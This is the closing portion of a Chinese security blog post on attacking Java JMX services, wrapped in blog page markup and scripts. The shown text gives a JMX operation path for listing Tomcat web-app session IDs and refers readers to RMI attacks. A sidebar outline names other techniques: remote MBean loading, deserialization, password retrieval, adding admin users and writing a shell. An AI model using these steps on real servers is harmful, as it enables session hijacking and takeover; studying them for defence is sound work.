+<h3 id="抓取网络应用的用户的session-ID"><a href="#抓取网络应用的用户的session-ID" class="headerlink" title="抓取网络应用的用户的session ID"></a>抓取网络应用的用户的session ID</h3><p>Catalina-&gt;Manager-&gt;[ApplicationName]-&gt;Operations-&gt;listSessionIds()</p>
+<h1 id="攻击五：RMI攻击"><a href="#攻击五：RMI攻击" class="headerlink" title="攻击五：RMI攻击"></a>攻击五：RMI攻击</h1><p>因为JMXServer是绑定RMi服务的，所以攻击RMI服务的方式都可以用来攻击JMXServer，这里不再赘述，可以去看RMI攻击的文章</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag"><i class="fas fa-tag"></i> java安全</a>
+          
+            <a href="/tags/JMX/" rel="tag"><i class="fas fa-tag"></i> JMX</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div>
+	  <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1azysugar
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://1azy.icu/2023/06/01/JMX/" title="JMX攻击">http://1azy.icu/2023/06/01/JMX/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议，转载请注明出处！
+  </li>
+</ul>
+
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/05/03/fastjson/" rel="next" title="fastjson全版本漏洞分析">
+                <i class="fas fa-chevron-left"></i> fastjson全版本漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+	        <img class="site-author-image" itemprop="image"
+                  src="/images/avatar.jpg"
+                  alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lazysugar" target="_blank" title="GitHub">
+                      
+		      
+			<i class="fa-fw fab fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1613664134@qq.com" target="_blank" title="E-Mail">
+                      
+		      
+			<i class="fa-fw fas fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JMX%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">JMX介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MBean"><span class="nav-number">1.1.</span> <span class="nav-text">MBean</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MBeanServer"><span class="nav-number">1.2.</span> <span class="nav-text">MBeanServer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%82%E9%85%8D%E5%99%A8%E5%92%8C%E8%BF%9E%E6%8E%A5%E5%99%A8"><span class="nav-number">1.3.</span> <span class="nav-text">适配器和连接器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8ERMI%E7%9A%84JMX%E6%BC%94%E7%A4%BA"><span class="nav-number">2.</span> <span class="nav-text">基于RMI的JMX演示</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8jconsole%E5%9B%BE%E5%BD%A2%E5%B7%A5%E5%85%B7%E7%9B%91%E8%A7%86%E3%80%81%E7%AE%A1%E7%90%86JMX"><span class="nav-number">2.1.</span> <span class="nav-text">使用jconsole图形工具监视、管理JMX</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8Melt%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BMBean"><span class="nav-number">3.</span> <span class="nav-text">攻击一：使用Melt加载远程MBean</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8DMLet"><span class="nav-number">3.1.</span> <span class="nav-text">介绍MLet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">攻击示例与分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BA%8C%EF%BC%9A%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDMBean"><span class="nav-number">4.</span> <span class="nav-text">攻击二：远程加载MBean</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="nav-number">4.1.</span> <span class="nav-text">攻击示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%B8%89%EF%BC%9A%E9%80%9A%E8%BF%87MBean%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BBJMX"><span class="nav-number">5.</span> <span class="nav-text">攻击三：通过MBean方法参数反序列化攻击JMX</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JMX%E8%B0%83%E7%94%A8MBean%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-number">5.1.</span> <span class="nav-text">JMX调用MBean的流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B-1"><span class="nav-number">5.2.</span> <span class="nav-text">攻击示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">5.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%9B%9B%EF%BC%9A%E5%88%A9%E7%94%A8%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%AD%89%E7%9A%84%E7%89%B9%E6%AE%8AMBean%E6%94%BB%E5%87%BBJMX"><span class="nav-number">6.</span> <span class="nav-text">攻击四：利用中间件等的特殊MBean攻击JMX</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87JMX%E6%94%BB%E5%87%BBTomcat"><span class="nav-number">6.1.</span> <span class="nav-text">通过JMX攻击Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%B7%B2%E6%9C%89%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">6.1.1.</span> <span class="nav-text">获取已有用户的密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%A7%92%E8%89%B2%E7%94%A8%E6%88%B7"><span class="nav-number">6.1.2.</span> <span class="nav-text">添加管理员角色用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%BE%AA%E7%8E%AF%E5%87%BD%E6%95%B0%E5%AF%BC%E8%87%B4%E5%86%99shell"><span class="nav-number">6.1.3.</span> <span class="nav-text">日志循环函数导致写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%9A%84%E7%94%A8%E6%88%B7%E7%9A%84session-ID"><span class="nav-number">6.1.4.</span> <span class="nav-text">抓取网络应用的用户的session ID</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BA%94%EF%BC%9ARMI%E6%94%BB%E5%87%BB"><span class="nav-number">7.</span> <span class="nav-text">攻击五：RMI攻击</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1azysugar</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fas fa-chart-area"></i>
+    </span>
+    
+      <span class="post-meta-item-text">全站共计字数&#58;</span>
+    
+    <span title="全站共计字数"></span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fas fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    <div class="sidebar_wo">
+      <div id="leimu">
+        <img src="/images/b2t/leimuA.png" alt="雷姆" onmouseover="this.src='/images/b2t/leimuB.png'" onmouseout="this.src='/images/b2t/leimuA.png'" title="回到顶部">
+      </div>
+      <div class="sidebar_wo" id="lamu">
+        <img src="/images/b2t/lamuA.png" alt="雷姆" onmouseover="this.src='/images/b2t/lamuB.png'" onmouseout="this.src='/images/b2t/lamuA.png'" title="回到底部">
+      </div>
+    </div>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fas fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="far fa-frown fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+<!-- 图片轮播js文件cdn -->
+<script src="https://cdn.bootcss.com/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+
+<!-- 剪贴板js文件 -->
+<script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>
+
+<script>
+
+<!-- 头像挂件及自动刷新 -->
+
+
+</script>
+
+<!-- 自定义的js文件 -->
+<script type="text/javascript" src="/js/src/custom.js"></script>
+</body>
+</html>
